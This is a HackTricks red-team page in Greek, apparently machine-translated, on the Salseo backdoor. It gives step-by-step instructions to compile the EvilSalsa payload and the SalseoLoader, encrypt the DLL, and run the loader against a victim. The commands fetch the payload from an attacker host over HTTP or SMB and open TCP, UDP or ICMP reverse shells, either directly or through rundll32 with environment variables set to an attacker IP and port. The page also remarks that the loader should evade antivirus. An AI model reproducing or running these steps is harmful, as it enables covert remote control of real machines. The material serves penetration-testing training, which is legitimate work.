# Salseo

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Συγκέντρωση των δυαδικών αρχείων

Κατεβάστε τον πηγαίο κώδικα από το github και συγκεντρώστε το **EvilSalsa** και το **SalseoLoader**. Θα χρειαστείτε εγκατεστημένο το **Visual Studio** για να συγκεντρώσετε τον κώδικα.

Συγκεντρώστε αυτά τα έργα για την αρχιτεκτονική του υπολογιστή Windows όπου θα τα χρησιμοποιήσετε (Αν τα Windows υποστηρίζουν x64, συγκεντρώστε τα για αυτές τις αρχιτεκτονικές).

Μπορείτε να **επιλέξετε την αρχιτεκτονική** μέσα στο Visual Studio στην **αριστερή καρτέλα "Build"** στην **"Platform Target".**

(\*\*Αν δεν μπορείτε να βρείτε αυτές τις επιλογές, πατήστε στην **"Project Tab"** και στη συνέχεια στην **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (839).png>)

Στη συνέχεια, κατασκευάστε και τα δύο έργα (Build -> Build Solution) (Μέσα στα logs θα εμφανιστεί η διαδρομή του εκτελέσιμου):

![](<../.gitbook/assets/image (381).png>)

## Προετοιμάστε το Backdoor

Πρώτα απ' όλα, θα χρειαστεί να κωδικοποιήσετε το **EvilSalsa.dll.** Για να το κάνετε αυτό, μπορείτε να χρησιμοποιήσετε το python script **encrypterassembly.py** ή μπορείτε να συγκεντρώσετε το έργο **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Εντάξει, τώρα έχετε όλα όσα χρειάζεστε για να εκτελέσετε όλα τα πράγματα Salseo: το **encoded EvilDalsa.dll** και το **binary of SalseoLoader.**

**Ανεβάστε το SalseoLoader.exe binary στη μηχανή. Δεν θα πρέπει να ανιχνευτούν από κανένα AV...**

## **Εκτέλεση του backdoor**

### **Λήψη ενός TCP reverse shell (κατεβάζοντας το encoded dll μέσω HTTP)**

Θυμηθείτε να ξεκινήσετε ένα nc ως τον listener του reverse shell και έναν HTTP server για να σερβίρετε το encoded evilsalsa.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Λήψη ενός UDP reverse shell (κατέβασμα κωδικοποιημένου dll μέσω SMB)**

Θυμηθείτε να ξεκινήσετε ένα nc ως τον listener του reverse shell και έναν SMB server για να εξυπηρετήσει το κωδικοποιημένο evilsalsa (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Λήψη ICMP αντίστροφης θήκης (κωδικοποιημένο dll ήδη μέσα στον θύμα)**

**Αυτή τη φορά χρειάζεστε ένα ειδικό εργαλείο στον πελάτη για να λάβετε την αντίστροφη θήκη. Κατεβάστε:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Απενεργοποίηση Απαντήσεων ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Εκτέλεση του πελάτη:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Μέσα στον θύμα, ας εκτελέσουμε το salseo πράγμα:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Συγκέντρωση του SalseoLoader ως DLL που εξάγει τη βασική λειτουργία

Ανοίξτε το έργο SalseoLoader χρησιμοποιώντας το Visual Studio.

### Προσθέστε πριν από τη βασική λειτουργία: \[DllExport]

![](<../.gitbook/assets/image (409).png>)

### Εγκαταστήστε το DllExport για αυτό το έργο

#### **Εργαλεία** --> **Διαχειριστής Πακέτων NuGet** --> **Διαχείριση Πακέτων NuGet για Λύση...**

![](<../.gitbook/assets/image (881).png>)

#### **Αναζητήστε το πακέτο DllExport (χρησιμοποιώντας την καρτέλα Περιήγηση) και πατήστε Εγκατάσταση (και αποδεχτείτε το αναδυόμενο παράθυρο)**

![](<../.gitbook/assets/image (100).png>)

Στο φάκελο του έργου σας έχουν εμφανιστεί τα αρχεία: **DllExport.bat** και **DllExport\_Configure.bat**

### **Α**πεγκαταστήστε το DllExport

Πατήστε **Απεγκατάσταση** (ναι, είναι περίεργο αλλά εμπιστευτείτε με, είναι απαραίτητο)

![](<../.gitbook/assets/image (97).png>)

### **Έξοδος από το Visual Studio και εκτέλεση του DllExport\_configure**

Απλά **έξοδος** από το Visual Studio

Στη συνέχεια, πηγαίνετε στο **φάκελο SalseoLoader** σας και **εκτελέστε το DllExport\_Configure.bat**

Επιλέξτε **x64** (αν πρόκειται να το χρησιμοποιήσετε μέσα σε ένα x64 box, αυτό ήταν η περίπτωση μου), επιλέξτε **System.Runtime.InteropServices** (μέσα στο **Namespace για DllExport**) και πατήστε **Εφαρμογή**

![](<../.gitbook/assets/image (882).png>)

### **Ανοίξτε ξανά το έργο με το Visual Studio**

**\[DllExport]** δεν θα πρέπει πλέον να επισημαίνεται ως σφάλμα

![](<../.gitbook/assets/image (670).png>)

### Δημιουργία της λύσης

Επιλέξτε **Τύπος Έξοδου = Βιβλιοθήκη Κλάσης** (Έργο --> Ιδιότητες SalseoLoader --> Εφαρμογή --> Τύπος εξόδου = Βιβλιοθήκη Κλάσης)

![](<../.gitbook/assets/image (847).png>)

Επιλέξτε **πλατφόρμα x64** (Έργο --> Ιδιότητες SalseoLoader --> Δημιουργία --> Στόχος πλατφόρμας = x64)

![](<../.gitbook/assets/image (285).png>)

Για να **δημιουργήσετε** τη λύση: Δημιουργία --> Δημιουργία Λύσης (Μέσα στην κονσόλα εξόδου θα εμφανιστεί η διαδρομή της νέας DLL)

### Δοκιμάστε την παραγόμενη DLL

Αντιγράψτε και επικολλήστε την DLL όπου θέλετε να τη δοκιμάσετε.

Εκτελέστε:
```
rundll32.exe SalseoLoader.dll,main
```
Αν δεν εμφανιστεί σφάλμα, πιθανότατα έχετε μια λειτουργική DLL!!

## Αποκτήστε ένα shell χρησιμοποιώντας τη DLL

Μην ξεχάσετε να χρησιμοποιήσετε έναν **HTTP** **server** και να ρυθμίσετε έναν **nc** **listener**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
